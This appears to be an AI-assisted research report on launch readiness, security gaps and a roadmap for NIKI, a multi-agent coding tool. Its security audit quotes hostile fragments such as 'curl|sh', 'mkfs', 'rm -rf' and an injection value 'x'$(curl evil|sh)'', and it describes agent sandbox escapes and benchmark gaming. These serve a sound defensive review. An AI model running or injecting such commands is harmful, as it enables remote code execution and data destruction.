# NIKI — Deep Research: Product Hunt Launch, Security, and the Path to #1

**Prepared:** 2026-08-08 · **Depth:** deep · **Scope:** (1) Product Hunt launch + GTM readiness, (2) user-facing security best practices, (3) every remaining gap to make NIKI the best of its kind.

This report is grounded in: 8 parallel web-research subagents, 4 internal codebase audit subagents, an adversarial verification pass, and direct repository inspection (git metadata, `cargo test --no-run`, LICENSE, release assets, `git ls-files`). Verified facts are marked; contested claims and fabrications are flagged.

---

## Executive summary

NIKI's *architecture* is genuinely strong: four independent agents isolated in containers, output as a reviewable branch, BYOK, auditable artifacts, a worktree fallback, a security auditor, parallel coders, and a TUI. That is a real, differentiated product.

But **as it stands today, NIKI is not launchable and not #1-ready.** Five things are true at once:

1. **The shipped binary is broken for every normal user.** The v0.2.0 release resolves `prompts/` and `schemas/` from `CARGO_MANIFEST_DIR` with a CWD fallback, but the release tarball ships only the binary + LICENSE + README. `niki run` fails for anyone not standing inside the source checkout. **This was reproduced and is a hard blocker.** (Verified: `cargo test --no-run` also fails to compile — 22 `E0433` errors — so the "220 tests passing" claim is unbacked for the unit suite; only the 220 integration tests pass, and only one target at a time.)
2. **The central trust claim is unbacked.** README says "Read FINDINGS.md … the data-backed answers"; `FINDINGS.md` and `ROADMAP.md` do not exist. The eval "proof" is 23 hand-authored JSON fixtures, and the CI test literally asserts `niki_catch_rate == 1.0` / `baseline_catch_rate == 0.0`. For a tool whose entire pitch is "proof, not promises," this is self-defeating.
3. **Real, fixable security gaps exist** that undermine the "hermetic by default" promise: the global command deny-list is never merged into per-role policies (so the coder role can run `curl|sh`, `mkfs`, `dd`); the container has network egress, no dropped capabilities, no PID limit, and no digest-pinned image; a `patch -p1` fallback enables path traversal; external URLs are injected into prompts with no SSRF guard; and the `worktree` backend runs LLM-generated commands **directly on the host**. The `goal` mode runs `sh -c` on the host and interpolates the user objective into a shell string (command injection).
4. **The license is a GTM and credibility landmine.** BUSL-1.1 is *not* open source; it blocks Homebrew-core, distro packaging, and enterprise procurement; the community reaction to relicensing is reliably hostile; and NIKI's LICENSE has a self-contradiction (Change Date `2030-07-20` is called "four years from the initial release" while the copyright is 2026, and the Change License `Apache-2.0` is *not* GPLv2-compatible, which the BSL spec requires). GitHub currently detects the license as `NOASSERTION`.
5. **There is no audience, no docs, and no install path.** 0 stars/forks/issues, repo created 2026-07-11; the landing page is client-side rendered (empty to crawlers); `cargo install niki` fails (not on crates.io); no `doctor`/`init` wizard; weak first-run errors; no CONTRIBUTING/SECURITY/CHANGELOG/CODE_OF_CONDUCT/issue templates; `assets/logo.svg` is 1 byte.

The good news: almost everything is *implementable*, not *architectural*. Below is the full plan.

> **Note on verification:** Two research claims were flagged as fabricated/mis-cited and corrected in this report: an arXiv harness-study's model-specific scores (only the generic "up to 40×" claim survives) and a Terminal-Bench score (Opus 4.6 = 76.4%, not the cited 69.9%). The internal-audit contradiction ("solid unit tests" vs "zero compile") was resolved in favor of the latter — `cargo test` does not compile (22 errors, Verified). See "Disagreements & open questions."

---

## Part 1 — Product Hunt launch & go-to-market readiness

### 1.1 Product Hunt mechanics that actually matter (2025–2026)

- PH resets the daily leaderboard at **12:01 AM PST**; the day is a full 24h and you want all of it. (source: producthunt.com/launch/preparing-for-launch)
- Upvote counts are **hidden for the first 4 hours (PT)** and homepage sort is randomized during that window — so the first 4 hours are not a ranking signal, they are momentum fuel. (source: producthunt.com/stories/let-s-talk-about-spam)
- **Hunters do not affect ranking.** Self-hunting is now standard and acceptable; PH explicitly says all upvotes are weighted equally and a hunter confers no ranking advantage. For a technical product, self-hunt so the copy is accurate. (source: help.producthunt.com/en/articles/10082986-hunter-vs-makers-and-how-to-change-them)
- PH **actively filters inauthentic/bot votes**; buying votes gets a product unlisted. (source: help.producthunt.com/en/articles/4853541-why-did-my-upvotes-go-down)
- Featuring guidelines (Mar 2026) require a **live** product; waitlists/templates/boilerplates are excluded. NIKI is usable, so a beta/early-access framing is fine. (source: help.producthunt.com/en/articles/8662020-featuring-guidelines)
- **Maker must reply to every comment** all day. 89% of Top-5 products did so in one study (that stat is unverified — see flags). (source: uprowshub.com/blog/product-hunt-50-launches-study — *directionally credible, specific numbers unverified*)
- Best day for dev tools per live-data tools: **Wed/Thu, 7–10 AM PST**. (source: noonlaunch.com/tools/best-day-to-launch-on-product-hunt)
- **The single strongest predictor of a Top-5 finish is first-4-hour momentum** (≥100 upvotes before 4 AM PT correlated with ~58% Top-5 odds in one study — *unverified specific number*). → You must mobilize a warm list in hour one, not discover PH on launch day.
- AI/bot-generated comments are explicitly unwelcome and reportable on PH. Write genuine, specific technical replies. (source: producthunt.com/stories/let-s-talk-about-spam)

### 1.2 What big engineering-led companies actually ship on day 1

Forensic evidence from initial commits/repos (Pingora, workerd, openai/codex, MCP, Cloudflare Agents SDK):

- **Day 1, present in essentially every case:** a LICENSE (named in sentence one of the announcement), a README that is a **distribution matrix** (one-line install for ≥2 package managers + per-platform prebuilt binaries), a blog post structured *problem → why now → what's in the box → who benefits → copy-paste 60-second example → explicit caveats → how to contribute*, a `docs/` or docs site with a quickstart, a worked `examples/` directory, CI workflows, issue templates, a named human author, named launch partners/early adopters, and **coordinated same-day posting** across blog + X + Discord/forum. (sources: blog.cloudflare.com/pingora-open-source, raw.githubusercontent.com/openai/codex/main/README.md, anthropic.com/news/model-context-protocol)
- **Commonly present but added weeks–months later:** CHANGELOG (Pingora: +5 weeks), SECURITY.md (Pingora: still absent), CODE_OF_CONDUCT, CODEOWNERS, formal RFC/governance (MCP governance landed ~12.5 months later). So you do not need everything, but you need the day-1 artifact set.
- **The "what's in the box" + "what it's NOT" honesty pattern wins trust.** Cloudflare's workerd launch post had an explicit "What it's not" section (openwarning it is "not a secure sandbox," "not an independent project") and was *rewarded* by HN for candor. (source: blog.cloudflare.com/workerd-open-source-workers-runtime)
- **Benchmarks:** required for infra/runtime categories (Cloudflare publishes reproducible methodology), but MCP and Codex CLI launched with **zero** published benchmarks and still achieved massive adoption — so benchmarks are not mandatory for a tool category like NIKI. What matters is that *any* number you publish is reproducible and honest.
- **A newer day-1 artifact:** a machine-readable `AGENTS.md` for agent context. AGENTS.md is now effectively a cross-tool standard (Linux Foundation AAIF, 2025-12-09). NIKI already ships one — good, keep it.
- **Launch-week mechanics (Supabase/Cloudflare):** a fixed-timeline, flexible-scope sprint; per-channel strategy (HN for deep technical, PH/design channels for UI); a minute-level run sheet; and a **retrospective** as the most important phase. (source: supabase.com/blog/supabase-how-we-launch)
- **Hacker News is the higher-signal channel for a technical tool.** Evidence is mixed: some founders report HN drove more *active* installs than PH; an arXiv study of 138 AI/LLM launches (2511.04453v1) found "Show HN" had no significant advantage after controls, but baseline stars and posting hour strongly predicted growth. Plan **PH → Show HN → relevant subreddits** sequenced.
- **Spike ≠ adoption.** PostHog/Wasp retrospectives: the durable win is a baseline WAU shift + specific feature requests, not the launch-day spike. Pre-launch signals (R²=0.48) predicted 7-day growth. → Build the warm list *before* launch day.

### 1.3 GTM gaps specific to NIKI (what you have NOT done yet)

| # | Gap | Severity | Evidence |
|---|---|---|---|
| G1 | **Release binary cannot run `niki run`** (prompts/schemas not bundled) | **BLOCKER** | Verified: reproduced `Error: Failed to read prompt template prompts/planner.md`; release tarball has only binary+LICENSE+README |
| G2 | **`FINDINGS.md`/`ROADMAP.md` do not exist** but are linked as the proof | **BLOCKER** | Verified: `ls` fails; README:65/287 |
| G3 | **Not on crates.io**; `cargo install niki` returns "crate does not exist"; README invites build-from-source (OpenSSL/libgit2, edition 2024) | High | crates.io API; Cargo.toml lacks `keywords/categories/readme/homepage/authors/exclude` |
| G4 | **`master` does not compile** (missing `use ratatui::style::Color`) | High | Verified: 22 `E0433` errors in `cargo test --no-run` |
| G5 | **No published sandbox image**; README never tells users to `docker build`; maintainer's own `~/.config/niki/niki.toml` references a nonexistent `ghcr.io/ravaniroshan/niki-sandbox:0.3.0` | High | docker/Dockerfile; config diff |
| G6 | **No `doctor`/`preflight`** command; cryptic first-run errors ("Anthropic API key not configured" with no pointer; `extra_packages` required even if you never use Docker) | High | src/cli; src/config/types.rs |
| G7 | **`truncate()` panics on multibyte strings**; **broken-pipe panic (exit 101)** when piping output (`\| head`, `\| less`) | Medium | src/display/artifact_render.rs:3; `niki recommend \| head` |
| G8 | `niki recommend` is a **static hardcoded table** despite README claiming "depends on cost analytics" | Medium | src/cli/recommend.rs |
| G9 | **No spend cap / pre-run cost estimate** (only post-hoc cost; context budget ≠ dollar cap) | Medium | src/cost.rs |
| G10 | **No CONTRIBUTING/SECURITY/CHANGELOG/CODE_OF_CONDUCT, no issue/PR templates, no CODEOWNERS, no FUNDING** | Medium | Verified: `.github/` has only `workflows/` |
| G11 | **`assets/logo.svg` is 1 byte**; hero image is an external GH CDN URL (breaks on crates.io/forks/offline) | Medium | Verified: `wc -c assets/logo.svg` = 1 |
| G12 | **Landing page is client-side rendered** (empty to crawlers/OG scrapers) | Medium | Verified via fetch: title only, no body |
| G13 | **No uninstall/clean command**; failed runs leave `.niki/` + branches; `.niki-worktrees/` not gitignored | Medium | src/main.rs; .gitignore |
| G14 | **"220 tests passing" badge is misleading** (only integration dir matches; 287 unit tests don't compile) and CI runs tests best-effort (`continue-on-error`) | Medium | Verified: ci.yml:39 |
| G15 | **`bench/` is empty**; no published benchmark numbers | Low | Verified: `git ls-files bench` = 0 |
| G16 | **0 stars/forks/issues, repo created 2026-07-11** — no warm audience exists | Critical (GTM) | Verified via GitHub API |

---

## Part 2 — Security: what to implement before users trust NIKI

Synthesis of OWASP (LLM01:2025, Agentic AI Top 10 2026), NVIDIA (Jan 2026), Anthropic, CSA, and multiple 2026 CVE reports. **Verified-real CVEs** among the claims: CVE-2026-21852, CVE-2026-39861, CVE-2026-33718, CVE-2025-55284, CVE-2025-59536 (Claude Code / OpenHands / agent-skills escapes). The pattern across 2025–2026: agents routinely **escape "sandboxes" via config/permission-model gaps, not by breaking the sandbox engine** — so defense-in-depth and OS-level isolation beat denylists.

### 2.1 The layered model you should implement

1. **Trust tiering** (`src/sandbox`): classify code source (self / repo / untrusted-external) and pick isolation. For untrusted-external input (fetched URLs, repo docs, dependency READMEs), you need at minimum hardened container; for production-data/credential-adjacent, microVM (gVisor/Firecracker).
2. **Filesystem:** read-only rootfs or overlay COW; mount only required dirs; server-side *symlink resolution + path-normalization allowlist*; never mount `docker.sock`; drop the `patch -p1` fallback (keep `git apply` only, or sanitize `+++`/`---` paths). (source: OpenHands #14902; PT-2026-28181 CVE)
3. **Network:** **default-deny egress** with a domain allowlist (or an egress proxy), blocking localhost/internal (169.254.169.254) to stop exfiltration + SSRF. (source: NVIDIA guidance; docker AI sandbox security docs)
4. **Permissions:** replace the deny-list with **scoped allowlists + runtime-enforced rules + human-in-the-loop for high-impact actions**. The global deny-list MUST be merged into every per-role policy (currently it is NOT — see S2). (source: code.claude.com/docs/en/permissions)
5. **Prompt-injection defense:** treat ALL fetched web/repo content as untrusted; delimit/isolate it in the prompt; add canary tokens; do NOT auto-execute repo configs/skills/README as instructions. (source: genai.owasp.org/llmrisk/llm01-prompt-injection; labs.cloudsecurityalliance.org …/20260317)
6. **Resource limits:** CPU/mem/**PIDs**/`activeDeadlineSeconds`/rate limits/`max-turns` to prevent runaway loops and fork-bombs. (source: NVIDIA; OWASP cheat sheet)
7. **Observability/audit:** log all actions; the `observability` and `audit` modules exist but are **dead code** — wire them with secret redaction before enabling.
8. **Credentials:** short-lived, least-privilege, never long-lived secrets inside the sandbox; store BYOK in OS keychain, send as `Authorization: Bearer`, never in URLs.

### 2.2 Security gaps specific to NIKI (what you have NOT done yet)

| # | Gap | Severity | Location / Evidence |
|---|---|---|---|
| S1 | **Global command deny-list never merged into per-role policies** → coder can run `curl\|sh`, `mkfs`, `dd`, `rm -rf`, `wget\|bash` | **HIGH** | `config/types.rs:116-130` defined; `:105` Default only; per-role policies omit it; comment at `:115` is inaccurate. Substring matching is also trivially bypassable |
| S2 | **Container has network egress, no CapDrop, no PidsLimit, not digest-pinned; R/W bind of whole repo** | **HIGH** | `sandbox/docker.rs:56-98,200-207` |
| S3 | **`patch -p1` fallback enables path traversal** outside the repo | **MED-HIGH** | `docker.rs:364-366`, `worktree.rs:256-262` |
| S4 | **SEARCH/REPLACE edits have no file-path binding** → can match the wrong file; 0.8 fuzzy match can silently corrupt | **MED** | `sandbox/edit_format.rs:109-212`, `artifacts/types.rs` |
| S5 | **External URLs fetched into prompts** unredacted, unbounded, no timeout, no SSRF guard | **MED-HIGH** | `knowledge/indexer.rs:86-92,279-285` |
| S6 | **`worktree` backend runs LLM commands directly on the host** (no OS isolation) | **HIGH** | `sandbox/worktree.rs:199-202` |
| S7 | **Google API key sent in URL query string** `?key=AIza…` (leaks to logs) | **HIGH** | `llm/google.rs:39-42` |
| S8 | **`goal` mode runs `sh -c` on host, unsandboxed**, and **interpolates the objective into a shell string** → command injection (`x'$(curl evil\|sh)'`) | **CRITICAL** | `goal/runner.rs:144`, `goal/creator.rs:204` |
| S9 | **Hermetic "proof" is forensic, not preventive** — a non-hermetic result does NOT abort; report falsely claims "Your working tree and existing branches were never mutated" | **MED** | `safety/mod.rs`, `output/report.rs` |
| S10 | **CI actions unpinned** to SHAs; no `cargo audit`/`deny`/Dependabot; release has sha256 only, no signing/attestation | **MED** | `.github/workflows/*` |
| S11 | **Artifacts written 0644** (world-readable; may contain secrets) | **MED** | `output/report.rs`, `audit/mod.rs` |
| S12 | **No `timeout` on LLM calls**; no 429/rate-limit retry | **MED** | `llm/*.rs` (`reqwest::Client::new()`) |
| S13 | **No `SIGTERM` handler**; Ctrl+C doesn't clean up `.niki-worktrees/` | **LOW-MED** | `cli/run.rs:246` |
| S14 | **Dead security controls** (`permissions`, `observability`, `audit`, MCP default-on) that give a false sense of protection | **MED** | `permissions/mod.rs`, `observability/mod.rs`, `mcp/mod.rs`, `config/types.rs:547,568` |
| S15 | **No SECURITY.md / threat model / responsible-disclosure / CODEOWNERS** | **LOW-MED** | repo root |

### 2.3 Supply chain & secret handling (minimum credible 2026 bar)

Verified-solid, mostly cheap, automatable:
- Store BYOK in OS keychain via `keyring`; `0600` file fallback (`secrecy`/`zeroize`); send as `Authorization: Bearer`, never in URLs. (sources: docs.rs/keyring; we confirmed `gh` itself still uses plaintext — so keychain is aspirational but correct as the target)
- **Pin all GitHub Actions to 40-char commit SHAs** (prevents the CVE-2025-30066 class). (source: cisa.gov alert 2025/03/17 — *verified real*)
- Enable **GitHub Artifact Attestations (SLSA L2)** + **Immutable Releases** (GA 2025-10-28). (sources: docs.github.com; github.blog/changelog/2025-10-28)
- Add **`cargo-audit` + `cargo-deny`** as separate CI jobs; generate **SBOM** (`cargo-sbom`/`cargo-cyclonedx`); least-privilege `permissions:` on all workflows. (sources: rustsec.org; EmbarkStudios/cargo-auditable)
- **Cosign/Sigstore keyless signing** of releases (cheap, worthwhile even if users don't manually verify). (source: docs.sigstore.dev)
- Use **crates.io Trusted Publishing (OIDC)** if/when you publish (GA ~2025). *Verify exact UI steps before relying on it.*
- **SLSA v1.2 is current** (v1.1 superseded) — the "v1.1 Retired" wording is slightly strong but the core claim holds.

---

## Part 3 — Every remaining gap to make NIKI #1 (the "truly best of its kind" plan)

### 3.1 Competitive reality (2026)

Verified-solid: AGENTS.md is a de-facto cross-tool standard (~60k+ projects, LF AAIF 2025-12-09). Claude Code / Codex CLI / Gemini CLI / Cursor / Devin / Windsurf / Amp / Cline / Roo / OpenHands / Aider / Continue are the field. **Table-stakes users now expect:** MCP support, slash commands + custom commands, subagents/delegation, hooks, session resume/checkpoint/undo, `/compact` context control, memory files (AGENTS.md/CLAUDE.md), git-worktree/branch-per-agent parallelism, headless/CI JSON mode + GitHub PR/action review, IDE extension, plan mode + granular permission prompts, image/web-fetch/web-search input, token & cost visibility, model routing/provider choice, sandboxed execution with egress controls, good terminal UX. (sources: docs.claude.com; agents.md; dagger/container-use)

**Multi-agent efficacy — genuinely contested:** Cognition (2025-06) argued against swarms; (2026-04) now ships multi-agent *where writes stay single-threaded*. Anthropic's research system showed +90.2% over single-agent Opus 4 at ~15× token cost. Practitioner HN consensus: "many readers / one writer," container-or-worktree isolation, human-in-the-loop gating — **not** autonomous parallel write-swarms. **NIKI's "independent agents that can't influence one another" thesis is aligned with the winning consensus** — lean into it, and be honest that parallel *writers* are fragile.

**Benchmark credibility is the hard part.** OpenAI retired SWE-bench Verified as a frontier eval (Feb 2026, contamination). Berkeley RDI showed *any* test-based bench can be gamed to 100% (conftest hook / fake curl / parser overwrite). Vendor self-reports run 20–30 points above independent runs. → If you publish numbers, use the official harness, pin model+date+harness, report pass@1 **and** pass^k (N≥5) with CIs, report tokens/cost/wall-clock, publish trajectories, and **complement with a private held-out set from your own/real repos** tracked over weeks. (sources: openai.com/index/why-we-no-longer-evaluate-swe-bench-verified; rdi.berkeley.edu; anthropic.com/engineering/infrastructure-noise)

**NIKI's competitive gaps vs the field (table-stakes NOT yet met):** no MCP support; no slash/custom commands; no hooks; no session resume/checkpoint/undo; no `/compact`; no IDE extension; no headless/CI JSON mode documented; no plan mode; no image/web-fetch tool in the agent loop (only `[knowledge]` URLs at config time); no PR-review action. The "four agents" are real but the *ecosystem/UX* layer is absent.

### 3.2 Dead code / facade findings (remove or wire — do not ship as if real)

- `mcp/`, `session/`, `permissions/`, `audit/`, `observability/` modules exist but are **never instantiated** (silent skeletons). Either wire them or document them as not-yet-active. (Verified: grep shows no callers outside own tests)
- `PipelineState` in `orchestrator/state.rs` is a **no-op** (`set_artifact`/`get_latest_feedback` do nothing).
- **Structured LLM output is dead** — `json_schema` always passed as `None`, so the artifact-validation machinery is never exercised. (Verified: `agents/mod.rs:76`)
- `src/agents/{coder,planner,reviewer,tester}.rs` are **stubs** (`pub fn run() {}`); real logic is generic `run_agent`. The "four specialized agents" framing is partly architecture theater.
- `staged_evidence_gates` in `goal/runner.rs:133` is a no-op stub.

### 3.3 The "best of its kind" roadmap (sequenced, testable)

**Phase 0 — Make it real (blockers, ~1–2 weeks):**
1. Embed `prompts/` + `schemas/` via `include_str!`/`include_dir!` (or resolve via `std::env::current_exe()`). **Fixes G1.** *Test: a clean `cargo install`-style binary runs `niki run` outside the source tree.*
2. Fix the `Color` import so `master` compiles; make `cargo test` green (or fix the 22 errors). **Fixes G4.** *Test: `cargo test` exits 0.*
3. Remove the broken `FINDINGS.md`/`ROADMAP.md` links **or** generate real ones from a reproducible eval. **Fixes G2.** *Test: every README link resolves.*
4. Replace the eval "proof" assertions with a real `niki eval --live` run, or clearly label fixtures as illustrative.

**Phase 1 — Make it safe (security, ~2–3 weeks):**
5. Merge global deny-list into every per-role policy; replace substring matching with allowlist + OS enforcement. **Fixes S1, part of S9.**
6. Harden container: `network_disabled` (or egress proxy allowlist), `CapDrop: ALL`, `PidsLimit`, digest-pinned base image, read-only rootfs where feasible. **Fixes S2.**
7. Drop `patch -p1` fallback; add path binding to SEARCH/REPLACE (bind to a specific file). **Fixes S3, S4.**
8. Treat `[knowledge]` URLs as untrusted: SSRF guard (block localhost/link-local/metadata), request timeout, prompt delimiting. **Fixes S5.**
9. Make `worktree` backend enforce the same command policy *and* run with reduced privileges / a seccomp profile, or clearly mark it as host-executing. **Fixes S6.**
10. Move Google key out of URL; extend `redact_secrets` to audit/observability/config serialization. **Fixes S7.**
11. Sandbox + allowlist + timeout the `goal` mode shell execution; stop interpolating the objective into `sh -c`. **Fixes S8 (CRITICAL).**
12. Make the hermetic proof *enforcing* (quarantine/abort on non-hermetic) and correct the report wording. **Fixes S9.**
13. Pin CI actions to SHAs; add `cargo audit`/`deny` + Dependabot; enable attestations + immutable releases + cosign. **Fixes S10.**
14. `chmod 0600` artifacts; add SIGTERM handler + worktree cleanup; add LLM timeouts + 429 retry. **Fixes S11–S13.**

**Phase 2 — Make it usable (GTM, ~2–3 weeks):**
15. Publish a sandbox image to `ghcr.io/ravaniroshan/niki-sandbox` (or document `docker build` prominently). **Fixes G5.**
16. Add `niki doctor` + an interactive `niki init` wizard (keyring + provider detection + validation). Make `extra_packages` optional. Improve error messages (actionable, with fix commands). **Fixes G6.**
17. Use `unicode-truncate` for `truncate()`; handle SIGPIPE. **Fixes G7.**
18. Either make `niki recommend` read real run history or stop claiming "cost analytics." Add a spend cap + pre-run estimate. **Fixes G8, G9.**
19. Add CONTRIBUTING/SECURITY/CHANGELOG/CODE_OF_CONDUCT + issue/PR templates + CODEOWNERS + FUNDING. Fix `logo.svg`. Make the landing page server-rendered/static (crawlable). **Fixes G10–G12.**
20. Add `niki clean`/uninstall guidance. Gitignore `.niki-worktrees/`. **Fixes G13.**

**Phase 3 — Make it competitive (table-stakes, ~3–4 weeks):**
21. Add MCP support; slash/custom commands; hooks; session resume/checkpoint/undo; `/compact`; plan mode; headless/CI JSON mode + a GitHub PR-review action; AGENTS.md-aware context. (Closes the competitive gaps in 3.1.)
22. Publish a real, reproducible eval (official harness + private held-out set, pass@k + CIs + cost) and a benchmarks page.
23. Publish to crates.io with proper metadata + musl static builds (or vendored OpenSSL/libgit2) to kill the runtime-library class of bugs. **Fixes G3.** (See distribution tradeoff in 3.4.)

**Phase 4 — Make it sustainable:**
24. Build the warm audience *before* launch: developer communities, a newsletter/PH Ship page, Show HN prep, a launch run sheet. **Addresses G16 — the biggest GTM risk.**
25. Decide the license question honestly (see 3.4) and communicate it without "open-washing."

### 3.4 The license decision (do this deliberately, not by default)

- BUSL-1.1 is **not** open source (SPDX-annotated). It blocks Homebrew-core (`license "cannot_represent"`), distro packaging (Nixpkgs `allowUnfree`, Debian/Fedora `unfree`), and enterprise procurement (manual legal review; FOSSA/Snyk flag it). Community reception to relicensing is reliably hostile (HashiCorp→OpenTofu/OpenBao; Elastic & Redis both *reversed* to AGPL). GitHub currently shows NIKI's license as `NOASSERTION`. (sources: spdx.org/licenses/BUSL-1.1.html; docs.brew.sh/License-Guidelines; chaoss.community; blog.sentry.io; elastic.co/blog; redis.io/blog/agplv3)
- **NIKI's LICENSE has a defect:** the BSL 1.1 spec caps the Change Date at **four years** from first public distribution; a later date is invalid and collapses to the 4-year backstop. NIKI says `2030-07-20 (four years from the initial release)` while the copyright is 2026 — that is **more than four years** and self-contradictory. Also, the **Change License must be GPLv2-or-later compatible; `Apache-2.0` is *not*** (AGPL is also invalid for the same reason). This needs a legal fix regardless of which license you choose. (sources: fossa.com; github.com/clockworklabs/SpacetimeDB/issues/215; wikipedia Business Source License)
- **Options:** (a) keep BUSL but fix the Change Date (≤4yr) and use a GPLv2-compatible Change License (e.g. MPL 2.0, as HashiCorp did); (b) switch to **FSL/Fair Source** (Sentry's 2-year conversion, honest framing); (c) **AGPLv3 + commercial dual license** (used by Elastic/Redis/MongoDB/Grafana; OSI-approved, maximizes trust + packaging); (d) Apache/MIT + Commons Clause / open core. Given NIKI is a developer tool where adoption and trust matter more than blocking managed competitors, **(c) AGPLv3-dual or (b) FSL** are the stronger launches. Avoid calling any source-available license "open source."
- **Trusted Publishing caveat:** crates.io does permit BUSL-1.1 crates, but `cargo-deny` license checks will flag it.

### 3.5 "Tested from every angle" — QA matrix (per your explicit ask)

- **Record/replay:** capture LLM traffic as cassettes (VCR-style) so tests run offline/deterministically. (`llmvcr` exists but is niche/unproven — use it as a starting point, not gospel.)
- **Mock providers** (you have `llm_mock_provider` — good) to test agent *logic* independent of model noise.
- **Chaos/fault injection:** 429s, timeouts, malformed/truncated JSON, tool failures (agent-chaos exists as a reference). Verify graceful degradation, no crash-loops.
- **Fuzz the patch/tool-output parser** (malformed diffs, empty/partial JSON) — directly closes the S3/S4 exploit class.
- **Cross-platform matrix** (OS/arch, Python versions, dependency drift) — pin and containerize.
- **E2E smoke vs real repos** (fast, always-on) + periodic full benchmark (slow, expensive), separated.
- **Eval-in-CI** to gate prompt/behavior regressions (promptfoo/Braintrust/Inspect).
- Make CI actually gate: remove `continue-on-error` from `cargo test`; fix the `clippy | tail -20` exit-code masking; run the integration matrix. Right now **CI is green by construction and tests nothing** (Verified: `ci.yml:27,39`).

---

## Background / key terms

- **BUSL-1.1 / FSL / AGPL:** source-available license families; BSL auto-converts to an open license on a Change Date; FSL is Sentry's 2-year variant; AGPL is OSI-approved copyleft with a network clause.
- **SWE-bench Verified / Terminal-Bench 2.0:** agentic coding benchmarks (bug-fix / real shell tasks). Both are now contested for "frontier" claims.
- **SLSA / Sigstore / cosign:** supply-chain provenance and keyless signing.
- **MicroVM (Firecracker/gVisor) vs container vs OS-isolation (bubblewrap/Seatbelt):** isolation strength tiers; containers share the host kernel and are insufficient for untrusted code.
- **AGENTS.md:** cross-tool agent-context standard (Linux Foundation AAIF).
- **pass@k vs pass^k:** luck vs reliability; report both for honest agent evals.

## Analysis & discussion

**Patterns across the findings:**
1. **NIKI overclaims and under-delivers on its three core promises.** "Proof, not promises" → broken FINDINGS.md + hand-authored fixtures. "Hermetic by default" → network-enabled containers, a bypassable denylist, a host-executing worktree backend, and a host-executing `goal` mode with injection. "Open/auditable" → dead audit/observability modules and a license GitHub can't even classify.
2. **The engineering is real but unverified.** The integration tests are genuinely good (220 pass), the orchestrator is substantial, the TUI works. But the unit suite doesn't compile and CI hides that, so the quality signal is false.
3. **The thesis is correct; the ecosystem is missing.** Independent, isolated agents (many readers / one writer) is the winning 2026 consensus. NIKI has the *agents* but none of the *table-stakes UX* (MCP, commands, hooks, sessions, IDE, CI mode, plan mode).
4. **Distribution and audience are the real GTM risks, not the tech.** 0 stars, no warm list, no crates.io, broken binary, client-rendered landing page. PH/HN reward preparation and a warm audience far more than copy quality.

**Strengths:** differentiated, honest (when fixed) isolation thesis; strong integration test scaffold; BYOK + multi-provider; real artifacts/TUI; AGENTS.md already present.

**Weaknesses:** broken shipped binary; false trust signals; security gaps that contradict the value prop; license defect + hostile-reception risk; no audience/docs/install path; dead-code facades; non-gating CI.

**Multiple perspectives:** A security maximalist would say *don't ship until S1–S13 are done* (the `goal` injection + host-executing backends are genuinely dangerous). A GTM pragmatist would say *fix the binary + docs + audience first, ship beta, iterate security in public with a SECURITY.md and a clear "not yet hardened" disclaimer*. Both are right — Phase 0+1 are non-negotiable; Phase 2–4 can be sequenced post-launch as long as you're honest about maturity.

## Conclusions & implications

- NIKI is **not** near-perfect-launch-ready today; it is a strong prototype with a broken release, false trust signals, real (fixable) security gaps, and no audience.
- The fastest path to a credible launch is **Phase 0 (binary + compile + honest proof) → Phase 1 (security) → Phase 2 (docs/install/audience)**, with the license decision made deliberately in Phase 2.
- "Truly #1" requires closing the table-stakes UX gap (MCP, commands, hooks, sessions, IDE, CI mode) and publishing *honest, reproducible* evals — not higher benchmark scores.
- The single most dangerous item is **S8 (host-executing `goal` mode with shell injection)** — fix before any public exposure.

## Recommendations

**Immediate actions (this week):**
1. Embed prompts/schemas or resolve via `current_exe()`; verify a clean binary runs `niki run` outside the source tree. (G1)
2. Fix the `Color` import; get `cargo test` green. (G4)
3. Remove/fix `FINDINGS.md`/`ROADMAP.md` links. (G2)
4. Fix the LICENSE Change Date + Change License (legal). (3.4)
5. Sandbox + stop interpolating the objective in `goal` mode. (S8)

**Further research / decisions:**
- License choice (BUSL-fix vs FSL vs AGPL-dual) — get a quick legal read.
- Distribution: crates.io + musl static vs vendored OpenSSL/libgit2; Homebrew tap vs core.
- Telemetry: default-off (recommended given community hostility to opt-out telemetry despite clig.dev permitting opt-out).
- Which table-stakes feature to build first post-launch (MCP vs IDE extension vs CI mode) — let early users decide.
- Reproducible eval harness + private held-out benchmark set.

## Disagreements & open questions

**Carried from verification (resolved where possible):**
- **Fabrication/mis-citation corrected:** arXiv 2607.22585 ("Scaffold Effect") does *not* contain the cited Claude Opus 4.5 52.1%/57.8% numbers — only the generic "up to 40× token" claim survives. Terminal-Bench Opus 4.6 = **76.4%** (not 69.9%). Report these carefully.
- **Internal contradiction resolved:** Audit 1's "many modules have solid unit tests" is **wrong** — `cargo test` does not compile (22 errors, Verified). Audit 3's "507 tests exist" is *reconcilable* (tests exist as source but don't build).
- **Unverified specific numbers:** uprowshub's 4.2×/82%/58%/89% stats; several lower Terminal-Bench/ SWE-bench rows; llm-stats.com scores (Cloudflare human-check). Treat as directional.
- **Single-source on contested topic:** llmvcr (0-star niche tool) — exists, don't over-rely; AGENTS.md "60k+" traces to one LF disclosure.
- **License open question:** does NIKI intend to keep BUSL despite the 4-year cap defect and AGPL-incompatible Change License? This determines packaging/adoption. (Verified: LICENSE currently self-contradictory.)

**Open questions from research:**
- Does PH still convert for dev tools in 2026, or is HN the better primary channel? Evidence mixed; plan both.
- microVM (Firecracker) vs gVisor vs OS-isolation "good enough" for NIKI's trust tiers? (No single standard.)
- Is AGENTS.md genuinely cross-vendor or Anthropic-adjacent? (Verify each vendor's docs.)
- Will any public benchmark be trusted, or is a private held-out set the only credible signal? (Lean: private set.)
- Which standardized independent runner will the industry converge on (Scale SEAL / Princeton HAL / Artificial Analysis)?

## Full source list

**Product Hunt:** producthunt.com/launch/preparing-for-launch · /stories/let-s-talk-about-spam · help.producthunt.com/en/articles/10082986-hunter-vs-makers · /en/articles/4853541-why-did-my-upvotes-go-down · /en/articles/8662020-featuring-guidelines · /launch/launch-day-duties · /launch/days-after-launch · uprowshub.com/blog/product-hunt-50-launches-study · noonlaunch.com/tools/best-day-to-launch-on-product-hunt · corbado.com/blog/launch-developer-tool-product-hunt · dev.to/ykiki/4-weeks-1-saas-3-upvotes · openstatus.dev/blog/product-hunt-launch-brutal-reality · medium.com/@baristaGeek/lessons-launching-a-developer-tool-on-hacker-news-vs-product-hunt · fmerian gist/dev.to faq-product-hunt-for-devtools

